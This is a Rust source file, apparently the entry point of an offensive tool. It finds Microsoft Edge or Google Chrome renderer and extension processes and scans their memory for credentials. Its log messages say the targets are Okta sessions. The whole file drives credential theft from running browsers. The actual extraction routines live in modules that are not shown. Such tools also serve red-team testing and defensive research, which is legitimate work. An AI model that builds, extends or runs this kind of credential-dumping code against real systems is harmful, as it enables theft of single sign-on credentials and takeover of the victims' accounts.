use cli::{parse_args, Application};

fn main() -> std::io::Result<()> {
    let args = parse_args();

    let (process_ids, extractors) = match args.application {
        Application::Msedge => {
            println!("[i] Scanning Microsoft Edge...");
            println!("[i] Getting target PID(s)");
            let pids = enumerate::get_program_pids("msedge.exe", Some(r"--type=renderer --extension-process"));
            let extractors: &[fn(&str, bool)] = &[extract::extract_credentials_chrome];
            (pids, extractors)
        }
        Application::Chrome => {
            println!("[i] Scanning Google Chrome...");
            println!("[i] Getting target PID(s)");
            let pids = enumerate::get_program_pids("chrome.exe", Some(r"--type=renderer --extension-process"));
            let extractors: &[fn(&str, bool)] = &[extract::extract_credentials_chrome];
            (pids, extractors)
        }
    };

    if !process_ids.is_empty() {
        println!("[+] Found {} Okta target PID(s).", process_ids.len());
        for pid in process_ids {
            println!("[+] Processing PID: {}", pid);
            println!("[i] Iterating over memory for PID {}", pid);
            let _ = dump::iterate_over_mem(pid.as_u32(), extractors, args.verbose);
        }
    } else {
        println!("[-] Could not find any target PIDs");
    }

    Ok(())
}
